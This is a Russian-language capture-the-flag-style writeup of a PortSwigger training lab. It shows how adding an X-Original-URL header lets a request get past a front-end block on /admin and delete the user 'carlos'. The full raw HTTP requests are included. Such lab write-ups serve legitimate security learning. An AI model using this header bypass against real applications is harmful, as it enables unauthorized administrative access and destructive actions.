---
title: "URL-based access control can be circumvented"
date: 2025-07-18
tags: [web, writeup]  
categories: [PortSwigger]
tagline: ""
header:
  overlay_image: /assets/images/IMG_writeups/IMG_PortSwigger/ps_logo.webp
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented"
classes: wide
---

Для прохождения нужно зайти в панель администратора и удалить пользователя `carlos`.

```
https://0a2600a604ab062180e8852a0058005c.web-security-academy.net/
```

## Solution

О как. Есть ссылка на панель админа, но у меня нет к ней доступа.

```
https://0a2600a604ab062180e8852a0058005c.web-security-academy.net/admin
```

Видим, что блокируют запросы по этому `URL`:

```http
GET / HTTP/2
Host: 0a2600a604ab062180e8852a0058005c.web-security-academy.net
Cookie: session=eknFKHZZHexxMzkwExN9i09JYw0RhXoo
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a2600a604ab062180e8852a0058005c.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

Попробую добавить заголовок `X-Original-URL` или `X-Rewrite-URL`. Они используются для изменения оригинального `URL` в запросе некоторыми фреймворками.

```http
GET / HTTP/2
Host: 0a2600a604ab062180e8852a0058005c.web-security-academy.net
Cookie: session=eknFKHZZHexxMzkwExN9i09JYw0RhXoo
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a2600a604ab062180e8852a0058005c.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
X-Original-Url: /admin
```

Ответ получен:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_access_control/IMG_URL-based_access_control_can_be_circumvented/1.png){: height="200" .align-center}

Найду энпоинт для удаления пользователя:

```
/admin/delete?username=carlos
```

Соберу запрос:

```http
GET /?username=carlos HTTP/2
Host: 0a2600a604ab062180e8852a0058005c.web-security-academy.net
Cookie: session=eknFKHZZHexxMzkwExN9i09JYw0RhXoo
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a2600a604ab062180e8852a0058005c.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
X-Original-Url: /admin/delete
```

Успех)

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_access_control/IMG_URL-based_access_control_can_be_circumvented/2.png){: height="200" .align-center}